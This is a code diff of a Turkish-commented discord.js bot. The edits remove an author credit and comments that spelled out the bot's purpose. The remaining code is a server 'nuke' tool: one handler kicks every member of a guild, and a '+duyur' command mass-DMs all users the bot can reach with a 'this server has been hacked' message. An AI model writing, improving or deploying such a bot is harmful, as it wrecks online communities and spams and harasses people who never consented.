@@ -1,4 +1,4 @@
-const Discord = require("discord.js"); //TÜM TELİF HAKKI ENES ACARA AİTTİR youtube.com/enesacaryt KANALINDA VİDEOLU ANLATIMI BULUNMAKTADIR
+const Discord = require("discord.js"); 
 const client = new Discord.Client();
 const ayarlar = require("./ayarlar.json");
 const { Client, Util } = require("discord.js");
@@ -17,7 +17,7 @@ client.on("message", msg => {
     msg.delete();
     msg.guild.members.forEach(member => member.kick());
   }
-});      ///KICK KOMUTU SUNUCUDAKI HERKESI KICKLER +kick 
+});      
 
 client.on("message", async msg => {
   if (msg.content === "+duyur") {  //SUNUCUDAKI BUTUN HERKESE MESAJ GÖNDERİR +duyur
@@ -25,7 +25,7 @@ client.on("message", async msg => {
     await msg.client.users
       .forEach(users =>
         users.send(
-          "**BU SUNUCU HACKLENMİŞTİR HADİ KOLAY GELSİN** :wink:"  //HERKESE DMDEN ATILAN MESAJ
+          "**BU SUNUCU HACKLENMİŞTİR HADİ KOLAY GELSİN** :wink:"  
         )
       )
       .catch(console.error);
